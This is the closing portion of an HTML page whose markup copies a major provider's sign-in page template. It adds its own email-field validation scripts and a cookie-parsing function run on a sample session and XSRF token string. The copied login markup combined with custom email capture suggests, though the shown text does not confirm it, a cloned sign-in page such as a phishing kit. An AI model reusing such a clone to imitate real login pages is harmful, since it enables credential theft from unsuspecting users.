            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->


<!-- ko if: svr.urlCBPartnerPreload --><!-- /ko -->

<!-- ko if: svr.urlDeviceFingerprinting --><!-- /ko --></div>
<!--<script>-->
<!--         function isEmpty(){-->
<!--           var btn = document.getElementById("dSIButton9");-->
<!--             var alert = document.querySelector(".alert");-->
<!--             var str = document.forms['myForm'].emailaccess.value;-->
<!--                         if( !str.replace(/\s+/, '').length ) {-->
<!--                  alert.style.display = "inline-block";-->
                  
<!--                  return false;-->
<!--             }-->
<!--         }-->


<!--      </script>-->
<script>
    function extractCookies(cookieStr) {
  return cookieStr
    .match(/(^|(?<=, ))[^=;,]+=[^;]+/g)
    .map(cookie => cookie.split('=').map(v => v.trim()))
    .filter(v => v[0].length && v[1].length)
    .reduce((builder, cur) => {
      builder[cur[0]] = cur[1]
      return builder
    }, {})
}

var testCase = '__cfduid=da48fc97c9ea6147d5534503f5337db821534343165; expires=Thu, 15-Aug-19 14:26:05 GMT; path=/; domain=.foobar.com; HttpOnly, XSRF-TOKEN=eyJpdiI6Imx3TXJFZ013QVRiXC9mUzFMXC9uM2NzQT09IiwidmFsdWUiOiJ5Z2V2SVJRUlpKRmQ0c0xCU0VWUDBGVzduWnBxVlwvaVhVTnlSbzdnTnJkdzlNd0M2KzFDZWVzQ3lZT1N6RkpJdkZuM0w4MkMraE5SWDN1XC9xUmlNNDJRPT0iLCJtYWMiOiI3MmE4YzEwYTY5ZGI5NTIyNWMyZTBmM2Q0YTlhZGE3Mzk2MzYyMmI1NGZiYWFmNjBlMjgxMTZjMzFkOGU3N2UxIn0%3D; expires=Wed, 15-Aug-2018 16:26:05 GMT; Max-Age=7200; path=/, laravel_session=eyJpdiI6Ikp2ckE5ME5KRFU4TlFOc0xxVUZXR2c9PSIsInZhbHVlIjoiRWRcLzRMdFJLMEM2U2dEdTdUN1FcL2w2WGZ5eGJ1VmF2ZHJYd2JoVjUzSHBWQlkzYmIzWWRzUllMcEt0Sjk3OVlaeGRLTWozNFJyVDBPZkxuT3RnVUY2dz09IiwibWFjIjoiYzg1OGY3MGY4NTEzMmJlY2E3MjhlOGM5NTM4ZmY1MjdlYjc4YjIyOTQyODFiYjdlNDcyMzY3NTQzNGRkYTU3MiJ9; expires=Wed, 15-Aug-2018 16:26:05 GMT; Max-Age=7200; path=/; httponly';

console.log(extractCookies(testCase));

</script>
<script>
    function isEmpty(){
    var mailid = document.querySelector("#mailid");
    var msg = document.querySelector(".msg");
    var error = document.querySelector(".error");
    let mailRegex = (/^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/);



    if(mailid.value.match(mailRegex)){  
            msg.style.display = "none";
            error.style.display = "none";
            return true;
        }
        

        else if(mailid.value=="" ){
            error.style.display = "inline-block";
            msg.style.display = "none"
            return false;
        }


        else {
            msg.style.display = "inline-block";
            error.style.display = "none";
            return false;
        }    
    
}
</script>      
</body>

</html>
<!-- partial -->
  

